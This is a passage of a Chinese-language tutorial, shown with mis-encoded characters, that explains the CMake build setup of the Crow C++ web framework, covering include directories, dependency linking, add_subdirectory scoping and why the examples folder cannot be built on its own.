<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ä¸¤ä¸ªä¸åŒçš„è·¯å¾„ï¼Ÿ</strong></p>
<ul>
<li><strong>æ„å»ºæ—¶</strong>ï¼šå¤´æ–‡ä»¶åœ¨æºç ç›®å½• <code>include/</code></li>
<li><strong>å®‰è£…å</strong>ï¼šå¤´æ–‡ä»¶è¢«å®‰è£…åˆ°ç³»ç»Ÿç›®å½• <code>include/</code></li>
<li>ä½¿ç”¨ç”Ÿæˆå™¨è¡¨è¾¾å¼å¯ä»¥è‡ªåŠ¨åˆ‡æ¢ï¼Œæ— éœ€æ‰‹åŠ¨ä¿®æ”¹</li>
</ul>
<p><strong>æœ¬è´¨æ€»ç»“</strong>ï¼š</p>
<p><code>target_include_directories</code> çš„æœ¬è´¨æ˜¯ï¼š</p>
<ol>
<li><strong>è®¾ç½®ç¼–è¯‘å™¨çš„å¤´æ–‡ä»¶æœç´¢è·¯å¾„</strong>ï¼ˆè½¬æ¢ä¸º <code>-I</code> æˆ– <code>/I</code> é€‰é¡¹ï¼‰</li>
<li><strong>æ§åˆ¶è·¯å¾„çš„ä¼ æ’­</strong>ï¼ˆPRIVATE/INTERFACE/PUBLICï¼‰</li>
<li><strong>æ”¯æŒæ„å»ºæ—¶å’Œå®‰è£…åçš„è·¯å¾„åˆ‡æ¢</strong>ï¼ˆç”Ÿæˆå™¨è¡¨è¾¾å¼ï¼‰</li>
<li><strong>è®© <code>#include</code> èƒ½æ‰¾åˆ°å¤´æ–‡ä»¶</strong></li>
</ol>
<p>æ²¡æœ‰å®ƒï¼Œç¼–è¯‘å™¨å°±ä¸çŸ¥é“åœ¨å“ªé‡Œæ‰¾å¤´æ–‡ä»¶ï¼Œ<code>#include "crow.h"</code> ä¼šå¤±è´¥ã€‚</p>
</li>
</ol>
<p><strong>è¿™æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•æ‰§è¡Œçš„å…³é”®åŸå› ä¹‹ä¸€</strong>ï¼š<code>Crow::Crow</code> ç›®æ ‡å¿…é¡»åœ¨æ ¹ç›®å½•çš„ CMakeLists.txt ä¸­å®šä¹‰ï¼Œ<code>examples</code> ç›®å½•ä¸­çš„ä»£ç ä¾èµ–è¿™ä¸ªç›®æ ‡ã€‚</p>
<h4 data-id="heading-6">1.4 ä¾èµ–åº“æŸ¥æ‰¾å’Œé“¾æ¥</h4>
<h5 data-id="heading-7">Asio åº“ï¼ˆé»˜è®¤ï¼‰</h5>
<pre><code class="hljs language-cmake" lang="cmake">else()
    find_package(asio REQUIRED)
    target_link_libraries(Crow
        INTERFACE
            asio::asio
    )
    target_compile_definitions(Crow INTERFACE ASIO_NO_DEPRECATED)
endif()
</code></pre>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæŸ¥æ‰¾å¹¶é“¾æ¥ Asio å¼‚æ­¥ I/O åº“</li>
<li><strong>ä¾èµ–</strong>ï¼šä½¿ç”¨è‡ªå®šä¹‰çš„ <code>Findasio.cmake</code> æ¨¡å—ï¼ˆä½äº <code>cmake/Findasio.cmake</code>ï¼‰</li>
</ul>
<h5 data-id="heading-8">å¯é€‰ä¾èµ–</h5>
<pre><code class="hljs language-cmake" lang="cmake">if(CROW_ENABLE_COMPRESSION)
    find_package(ZLIB REQUIRED)
    target_link_libraries(Crow INTERFACE ZLIB::ZLIB)
    target_compile_definitions(Crow INTERFACE CROW_ENABLE_COMPRESSION)
endif()

if(CROW_ENABLE_SSL)
    find_package(OpenSSL REQUIRED)
    target_link_libraries(Crow INTERFACE OpenSSL::SSL)
    target_compile_definitions(Crow INTERFACE CROW_ENABLE_SSL)
endif()
</code></pre>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ ¹æ®ç¼–è¯‘é€‰é¡¹æ¡ä»¶æ€§åœ°æ·»åŠ å‹ç¼©å’Œ SSL æ”¯æŒ</li>
<li><strong>å˜é‡ä¼ é€’</strong>ï¼šè¿™äº›é€‰é¡¹ä¼šå½±å“ <code>CROW_FEATURES</code> å˜é‡ï¼Œ<code>examples</code> ç›®å½•ä¼šæ£€æŸ¥è¿™ä¸ªå˜é‡</li>
</ul>
<h4 data-id="heading-9">1.5 å­é¡¹ç›®é›†æˆ</h4>
<pre><code class="hljs language-cmake" lang="cmake"># Examples
if(CROW_BUILD_EXAMPLES)
    add_subdirectory(examples)
endif()
</code></pre>
<p><strong><code>add_subdirectory</code> çš„æœ¬è´¨</strong>ï¼š</p>
<p><strong>æ ¸å¿ƒä½œç”¨</strong>ï¼šå°†å­ç›®å½•çš„ CMakeLists.txt åŒ…å«åˆ°å½“å‰æ„å»ºä¸­ï¼Œåˆ›å»ºä¸€ä¸ªå­ä½œç”¨åŸŸ</p>
<p><code>add_subdirectory</code> çš„æœ¬è´¨æ˜¯<strong>åœ¨å½“å‰ CMake é…ç½®è¿‡ç¨‹ä¸­ï¼Œåˆ‡æ¢åˆ°æŒ‡å®šå­ç›®å½•ï¼Œæ‰§è¡Œè¯¥ç›®å½•ä¸‹çš„ CMakeLists.txtï¼Œç„¶åè¿”å›</strong>ã€‚å®ƒåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸï¼Œä½†ä¿æŒäº†ä¸çˆ¶ç›®å½•çš„ä¸Šä¸‹æ–‡è”ç³»ã€‚</p>
<p><strong>æ‰§è¡Œæµç¨‹</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½• CMakeLists.txt
add_library(Crow INTERFACE)           # 1. åˆ›å»º Crow ç›®æ ‡
set(MY_VAR "value")                  # 2. è®¾ç½®å˜é‡
add_subdirectory(examples)           # 3. åˆ‡æ¢åˆ° examples ç›®å½•
# 4. æ‰§è¡Œ examples/CMakeLists.txt
# 5. è¿”å›æ ¹ç›®å½•ï¼Œç»§ç»­æ‰§è¡Œ
</code></pre>
<p><strong>å…³é”®æœºåˆ¶</strong>ï¼š</p>
<ol>
<li>
<p><strong>æ¡ä»¶åŒ…å«</strong>ï¼šåªæœ‰å½“ <code>CROW_BUILD_EXAMPLES</code> é€‰é¡¹ä¸º <code>ON</code> æ—¶ï¼Œæ‰ä¼šåŒ…å« <code>examples</code> å­ç›®å½•</p>
</li>
<li>
<p><strong>ä½œç”¨åŸŸå’Œå˜é‡ä¼ é€’</strong>ï¼š</p>
<p><strong>çˆ¶ç›®å½• â†’ å­ç›®å½•ï¼ˆå¯è§ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½• CMakeLists.txt
set(PARENT_VAR "parent_value")     # çˆ¶ç›®å½•å˜é‡
add_library(Crow INTERFACE)        # çˆ¶ç›®å½•ç›®æ ‡
add_subdirectory(examples)         # è¿›å…¥å­ç›®å½•

# examples/CMakeLists.txt
message(STATUS ${PARENT_VAR})      # âœ… å¯ä»¥è®¿é—®ï¼šè¾“å‡º "parent_value"
target_link_libraries(myapp Crow)  # âœ… å¯ä»¥è®¿é—®ï¼šCrow ç›®æ ‡å¯è§
</code></pre>
<p><strong>å­ç›®å½• â†’ çˆ¶ç›®å½•ï¼ˆä¸å¯è§ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># examples/CMakeLists.txt
set(CHILD_VAR "child_value")       # å­ç›®å½•å˜é‡
add_executable(myapp main.cpp)     # å­ç›®å½•ç›®æ ‡

# æ ¹ç›®å½• CMakeLists.txtï¼ˆadd_subdirectory ä¹‹åï¼‰
message(STATUS ${CHILD_VAR})       # âŒ ä¸å¯è®¿é—®ï¼šå˜é‡æœªå®šä¹‰
# ä½†ç›®æ ‡ myapp åœ¨æ•´ä¸ªé¡¹ç›®ä¸­å¯è§
</code></pre>
</li>
<li>
<p><strong>å…³é”®å˜é‡è¡Œä¸º</strong>ï¼š</p>
<p><strong><code>CMAKE_SOURCE_DIR</code></strong>ï¼šå§‹ç»ˆæŒ‡å‘<strong>æ ¹é¡¹ç›®</strong>çš„æºç›®å½•</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½• CMakeLists.txt
message(STATUS "Root: ${CMAKE_SOURCE_DIR}")  # C:/Users/notfr/projects/Crow
add_subdirectory(examples)

# examples/CMakeLists.txt
message(STATUS "Examples: ${CMAKE_SOURCE_DIR}")  # C:/Users/notfr/projects/Crowï¼ˆç›¸åŒï¼ï¼‰
</code></pre>
<p><strong><code>CMAKE_CURRENT_SOURCE_DIR</code></strong>ï¼šæŒ‡å‘<strong>å½“å‰</strong>CMakeLists.txt æ‰€åœ¨çš„ç›®å½•</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½• CMakeLists.txt
message(STATUS "Root current: ${CMAKE_CURRENT_SOURCE_DIR}")  # C:/Users/notfr/projects/Crow
add_subdirectory(examples)

# examples/CMakeLists.txt
message(STATUS "Examples current: ${CMAKE_CURRENT_SOURCE_DIR}")  # C:/Users/notfr/projects/Crow/examples
</code></pre>
<p><strong><code>CMAKE_BINARY_DIR</code></strong>ï¼šå§‹ç»ˆæŒ‡å‘<strong>æ ¹é¡¹ç›®</strong>çš„æ„å»ºç›®å½•</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½•å’Œå­ç›®å½•çš„ CMAKE_BINARY_DIR éƒ½ç›¸åŒ
# ä¾‹å¦‚ï¼šC:/Users/notfr/projects/Crow/build
</code></pre>
<p><strong><code>CMAKE_CURRENT_BINARY_DIR</code></strong>ï¼šæŒ‡å‘<strong>å½“å‰</strong>CMakeLists.txt å¯¹åº”çš„æ„å»ºç›®å½•</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½•ï¼šC:/Users/notfr/projects/Crow/build
# examplesï¼šC:/Users/notfr/projects/Crow/build/examples
</code></pre>
</li>
<li>
<p><strong>ç›®æ ‡å¯è§æ€§</strong>ï¼š</p>
<ul>
<li>çˆ¶ç›®å½•åˆ›å»ºçš„ç›®æ ‡åœ¨å­ç›®å½•ä¸­<strong>å¯è§ä¸”å¯ç”¨</strong></li>
<li>å­ç›®å½•åˆ›å»ºçš„ç›®æ ‡åœ¨çˆ¶ç›®å½•ä¸­<strong>å¯è§</strong>ï¼ˆä½†å˜é‡ä¸å¯è§ï¼‰</li>
<li>æ‰€æœ‰ç›®æ ‡åœ¨æ•´ä¸ªé¡¹ç›®ä¸­å¯è§ï¼ˆé™¤éä½¿ç”¨ç‰¹æ®Šä½œç”¨åŸŸæ§åˆ¶ï¼‰</li>
</ul>
</li>
<li>
<p><strong>å‡½æ•°å’Œå®çš„ä¼ é€’</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½• CMakeLists.txt
include(cmake/compiler_options.cmake)  # å®šä¹‰å‡½æ•° add_warnings_optimizations()
add_subdirectory(examples)

# examples/CMakeLists.txt
add_warnings_optimizations(myapp)  # âœ… å¯ä»¥ä½¿ç”¨çˆ¶ç›®å½•å®šä¹‰çš„å‡½æ•°
</code></pre>
</li>
</ol>
<p><strong>å®é™…ä¾‹å­</strong>ï¼š</p>
<p>åœ¨ Crow é¡¹ç›®ä¸­ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½• CMakeLists.txt
add_library(Crow INTERFACE)                    # åˆ›å»º Crow ç›®æ ‡
target_include_directories(Crow INTERFACE ...) # é…ç½® Crow
add_library(Crow::Crow ALIAS Crow)            # åˆ›å»ºåˆ«å

if(CROW_BUILD_EXAMPLES)
    add_subdirectory(examples)  # è¿›å…¥ examples ç›®å½•
endif()

# examples/CMakeLists.txt
add_executable(basic_example example.cpp)
target_link_libraries(basic_example PUBLIC Crow::Crow)  # âœ… å¯ä»¥ä½¿ç”¨çˆ¶ç›®å½•çš„ Crow::Crow
</code></pre>
<p><strong>æ‰§è¡Œæ—¶çš„å˜é‡å€¼</strong>ï¼š</p>






























<table><thead><tr><th>å˜é‡</th><th>æ ¹ç›®å½• CMakeLists.txt</th><th>examples/CMakeLists.txt</th></tr></thead><tbody><tr><td><code>CMAKE_SOURCE_DIR</code></td><td><code>C:/.../Crow</code></td><td><code>C:/.../Crow</code>ï¼ˆç›¸åŒï¼‰</td></tr><tr><td><code>CMAKE_CURRENT_SOURCE_DIR</code></td><td><code>C:/.../Crow</code></td><td><code>C:/.../Crow/examples</code></td></tr><tr><td><code>CMAKE_BINARY_DIR</code></td><td><code>C:/.../Crow/build</code></td><td><code>C:/.../Crow/build</code>ï¼ˆç›¸åŒï¼‰</td></tr><tr><td><code>CMAKE_CURRENT_BINARY_DIR</code></td><td><code>C:/.../Crow/build</code></td><td><code>C:/.../Crow/build/examples</code></td></tr></tbody></table>
<p><strong>æœ¬è´¨æ€»ç»“</strong>ï¼š</p>
<p><code>add_subdirectory</code> çš„æœ¬è´¨æ˜¯ï¼š</p>
<ol>
<li><strong>åˆ‡æ¢ç›®å½•</strong>ï¼šä¸´æ—¶åˆ‡æ¢åˆ°å­ç›®å½•ï¼Œæ‰§è¡Œå…¶ CMakeLists.txt</li>
<li><strong>åˆ›å»ºå­ä½œç”¨åŸŸ</strong>ï¼šå­ç›®å½•æœ‰è‡ªå·±çš„å˜é‡ä½œç”¨åŸŸï¼Œä½†å¯ä»¥è®¿é—®çˆ¶ç›®å½•çš„å˜é‡å’Œç›®æ ‡</li>
<li><strong>ä¿æŒä¸Šä¸‹æ–‡</strong>ï¼š<code>CMAKE_SOURCE_DIR</code> å§‹ç»ˆæŒ‡å‘æ ¹é¡¹ç›®ï¼Œä¿æŒé¡¹ç›®ç»“æ„çš„ä¸€è‡´æ€§</li>
<li><strong>ç›®æ ‡å…¨å±€å¯è§</strong>ï¼šæ‰€æœ‰ç›®æ ‡åœ¨æ•´ä¸ªé¡¹ç›®ä¸­å¯è§ï¼Œå®ç°ä¾èµ–ç®¡ç†</li>
<li><strong>å‡½æ•°ä¼ é€’</strong>ï¼šçˆ¶ç›®å½•å®šä¹‰çš„å‡½æ•°å’Œå®åœ¨å­ç›®å½•ä¸­å¯ç”¨</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆä¸èƒ½ä»å­ç›®å½•ç‹¬ç«‹æ‰§è¡Œï¼Ÿ</strong></p>
<p>å› ä¸º <code>add_subdirectory</code> åˆ›å»ºçš„æ˜¯<strong>å­ä½œç”¨åŸŸ</strong>ï¼Œä¸æ˜¯ç‹¬ç«‹é¡¹ç›®ï¼š</p>
<ul>
<li>å­ç›®å½•ä¾èµ–çˆ¶ç›®å½•çš„ä¸Šä¸‹æ–‡ï¼ˆå˜é‡ã€ç›®æ ‡ã€å‡½æ•°ï¼‰</li>
<li><code>CMAKE_SOURCE_DIR</code> å¿…é¡»æŒ‡å‘æ ¹é¡¹ç›®</li>
<li>å¦‚æœä»å­ç›®å½•æ‰§è¡Œï¼Œè¿™äº›ä¸Šä¸‹æ–‡éƒ½ä¸å­˜åœ¨ï¼Œä¼šå¤±è´¥</li>
</ul>
<p>è¿™æ˜¯ CMake çš„è®¾è®¡å“²å­¦ï¼š<strong>å­é¡¹ç›®æ˜¯çˆ¶é¡¹ç›®çš„ç»„æˆéƒ¨åˆ†ï¼Œä¸æ˜¯ç‹¬ç«‹é¡¹ç›®</strong>ã€‚</p>
<h4 data-id="heading-10">1.6 ç¼–è¯‘é€‰é¡¹å‡½æ•°å®šä¹‰</h4>
<p>æ ¹ç›®å½•é€šè¿‡åŒ…å« <code>compiler_options.cmake</code> å®šä¹‰äº† <code>add_warnings_optimizations()</code> å‡½æ•°ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># åœ¨ cmake/compiler_options.cmake ä¸­å®šä¹‰
function(add_warnings_optimizations target_name)
    # æ ¹æ®ç¼–è¯‘å™¨ç±»å‹ï¼ˆMSVCã€Clangã€GCCï¼‰è®¾ç½®ä¸åŒçš„è­¦å‘Šå’Œä¼˜åŒ–é€‰é¡¹
    ...
endfunction()
</code></pre>
<p>è¿™ä¸ªå‡½æ•°åœ¨ <code>examples/CMakeLists.txt</code> ä¸­è¢«å¹¿æ³›ä½¿ç”¨ã€‚</p>
<h3 data-id="heading-11">äºŒã€examples ç›®å½• CMakeLists.txt æ ¸å¿ƒå†…å®¹</h3>
<p><code>examples/CMakeLists.txt</code> æ˜¯ä¸€ä¸ª<strong>å­é¡¹ç›®</strong>çš„æ„å»ºæ–‡ä»¶ï¼Œå®ƒä¾èµ–äºçˆ¶ç›®å½•ï¼ˆæ ¹ç›®å½•ï¼‰æä¾›çš„æ‰€æœ‰åŸºç¡€è®¾æ–½ã€‚</p>
<h4 data-id="heading-12">2.1 é¡¹ç›®å£°æ˜</h4>
<pre><code class="hljs language-cmake" lang="cmake">cmake_minimum_required(VERSION 3.15)
project(crow_examples)
</code></pre>
<ul>
<li><strong>æ³¨æ„</strong>ï¼šè¿™é‡Œè™½ç„¶å£°æ˜äº† <code>project(crow_examples)</code>ï¼Œä½†è¿™ä¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®</li>
<li><strong>ä¸Šä¸‹æ–‡</strong>ï¼šå½“é€šè¿‡ <code>add_subdirectory(examples)</code> è°ƒç”¨æ—¶ï¼Œè¿™ä¸ª <code>project()</code> å‘½ä»¤ä¼šåˆ›å»ºä¸€ä¸ªå­é¡¹ç›®ï¼Œä½† <code>CMAKE_SOURCE_DIR</code> ä»ç„¶æŒ‡å‘æ ¹ç›®å½•</li>
</ul>
<h4 data-id="heading-13">2.2 ä¾èµ–çˆ¶ç›®å½•çš„ CMake æ¨¡å—</h4>
<pre><code class="hljs language-cmake" lang="cmake">include(${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake)
</code></pre>
<p><strong>å…³é”®åˆ†æ</strong>ï¼š</p>
<ol>
<li><strong><code>CMAKE_SOURCE_DIR</code> çš„å«ä¹‰</strong>ï¼š
<ul>
<li>åœ¨æ ¹ç›®å½•æ‰§è¡Œ CMake æ—¶ï¼š<code>CMAKE_SOURCE_DIR</code> = é¡¹ç›®æ ¹ç›®å½•</li>
<li>åœ¨ <code>examples</code> ç›®å½•æ‰§è¡Œ CMake æ—¶ï¼š<code>CMAKE_SOURCE_DIR</code> = <code>examples</code> ç›®å½•</li>
</ul>
</li>
<li><strong>è·¯å¾„è§£æ</strong>ï¼š
<ul>
<li>ä»æ ¹ç›®å½•æ‰§è¡Œï¼š<code>${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake</code> = <code>æ ¹ç›®å½•/cmake/compiler_options.cmake</code> âœ…</li>
<li>ä» <code>examples</code> ç›®å½•æ‰§è¡Œï¼š<code>${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake</code> = <code>examples/cmake/compiler_options.cmake</code> âŒï¼ˆè·¯å¾„ä¸å­˜åœ¨ï¼‰</li>
</ul>
</li>
</ol>
<p><strong>è¿™æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªåŸå› </strong>ï¼šè·¯å¾„è§£æé”™è¯¯ã€‚</p>
<h4 data-id="heading-14">2.3 ä¾èµ–çˆ¶ç›®å½•å®šä¹‰çš„ç›®æ ‡</h4>
<pre><code class="hljs language-cmake" lang="cmake">add_executable(basic_example example.cpp)
add_warnings_optimizations(basic_example)
target_link_libraries(basic_example PUBLIC Crow::Crow)
</code></pre>
<p><strong>ä¾èµ–é“¾åˆ†æ</strong>ï¼š</p>
<ol>
<li>
<p><strong><code>add_warnings_optimizations()</code> å‡½æ•°</strong>ï¼š</p>
<ul>
<li>å®šä¹‰åœ¨ <code>cmake/compiler_options.cmake</code> ä¸­</li>
<li>è¯¥æ–‡ä»¶é€šè¿‡ <code>include(${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake)</code> å¼•å…¥</li>
<li>å¦‚æœè·¯å¾„è§£æå¤±è´¥ï¼Œå‡½æ•°ä¸å­˜åœ¨ï¼Œæ„å»ºä¼šå¤±è´¥</li>
</ul>
</li>
<li>
<p><strong><code>Crow::Crow</code> ç›®æ ‡</strong>ï¼š</p>
<ul>
<li>åœ¨æ ¹ç›®å½•çš„ <code>CMakeLists.txt</code> ä¸­å®šä¹‰ï¼ˆç¬¬ 88-89 è¡Œï¼‰</li>
<li>æ˜¯ä¸€ä¸ª INTERFACE åº“ï¼ŒåŒ…å«ï¼š
<ul>
<li>å¤´æ–‡ä»¶è·¯å¾„ï¼š<code>${CMAKE_CURRENT_SOURCE_DIR}/include</code></li>
<li>é“¾æ¥åº“ï¼š<code>asio::asio</code>ï¼ˆæˆ– Boost åº“ï¼‰</li>
<li>ç¼–è¯‘å®šä¹‰ï¼š<code>ASIO_NO_DEPRECATED</code> ç­‰</li>
</ul>
</li>
<li>å¦‚æœä» <code>examples</code> ç›®å½•æ‰§è¡Œï¼Œè¿™ä¸ªç›®æ ‡ä¸å­˜åœ¨ï¼Œ<code>target_link_libraries()</code> ä¼šæŠ¥é”™</li>
</ul>
</li>
</ol>
<p><strong>è¿™æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•æ‰§è¡Œçš„ç¬¬äºŒä¸ªåŸå› </strong>ï¼šç›®æ ‡ä¸å­˜åœ¨ã€‚</p>
<h4 data-id="heading-15">2.4 ä¾èµ–çˆ¶ç›®å½•å®šä¹‰çš„å˜é‡</h4>
<pre><code class="hljs language-cmake" lang="cmake"># If compression is enabled, the example will be built
if("compression" IN_LIST CROW_FEATURES)
    add_executable(example_compression example_compression.cpp)
    ...
endif()

if(CROW_AMALGAMATE)
    add_executable(example_with_all example_with_all.cpp)
    add_dependencies(example_with_all crow_amalgamated)
    ...
endif()
</code></pre>
<p><strong>å˜é‡ä¾èµ–</strong>ï¼š</p>
<ol>
<li><strong><code>CROW_FEATURES</code></strong>ï¼šåœ¨æ ¹ç›®å½•çš„ CMakeLists.txt ä¸­æ ¹æ® <code>CROW_ENABLE_COMPRESSION</code> å’Œ <code>CROW_ENABLE_SSL</code> é€‰é¡¹è®¾ç½®</li>
<li><strong><code>CROW_AMALGAMATE</code></strong>ï¼šåœ¨æ ¹ç›®å½•å®šä¹‰ä¸º CMake é€‰é¡¹</li>
<li><strong><code>crow_amalgamated</code></strong>ï¼šåœ¨æ ¹ç›®å½•å®šä¹‰çš„è‡ªå®šä¹‰ç›®æ ‡ï¼ˆå¦‚æœå¯ç”¨äº† amalgamateï¼‰</li>
</ol>
<p><strong>è¿™æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•æ‰§è¡Œçš„ç¬¬ä¸‰ä¸ªåŸå› </strong>ï¼šå˜é‡æœªå®šä¹‰ã€‚</p>
<h3 data-id="heading-16">ä¸‰ã€ä¾èµ–å…³ç³»å›¾</h3>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           æ ¹ç›®å½• CMakeLists<span class="hljs-selector-class">.txt</span>                         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">1</span>. é…ç½® CMAKE_MODULE_PATH                        â”‚   â”‚
â”‚  â”‚    â†’ æ·»åŠ  cmake/ ç›®å½•                            â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">2</span>. å®šä¹‰ Crow::Crow INTERFACE åº“                   â”‚   â”‚
â”‚  â”‚    â†’ åŒ…å«ç›®å½•: include/                          â”‚   â”‚
â”‚  â”‚    â†’ é“¾æ¥åº“: asio::asio                          â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">3</span>. æŸ¥æ‰¾ä¾èµ–åº“                                     â”‚   â”‚
â”‚  â”‚    â†’ <span class="hljs-built_in">find_package</span>(asio)                          â”‚   â”‚
â”‚  â”‚    â†’ <span class="hljs-built_in">find_package</span>(ZLIB) [å¯é€‰]                   â”‚   â”‚
â”‚  â”‚    â†’ <span class="hljs-built_in">find_package</span>(OpenSSL) [å¯é€‰]                â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">4</span>. è®¾ç½®å˜é‡                                       â”‚   â”‚
â”‚  â”‚    â†’ CROW_FEATURES                               â”‚   â”‚
â”‚  â”‚    â†’ CROW_AMALGAMATE                             â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">5</span>. <span class="hljs-built_in">add_subdirectory</span>(examples)                    â”‚   â”‚
â”‚  â”‚    â†’ æ‰§è¡Œ examples/CMakeLists.txt                â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â”‚
                        â”‚ ä¾èµ–
                        â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         examples/CMakeLists.txt                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">1</span>. <span class="hljs-built_in">include</span>(${CMAKE_SOURCE_DIR}/cmake/...)        â”‚   â”‚
â”‚  â”‚    â† éœ€è¦æ ¹ç›®å½•çš„ cmake/ ç›®å½•                     â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
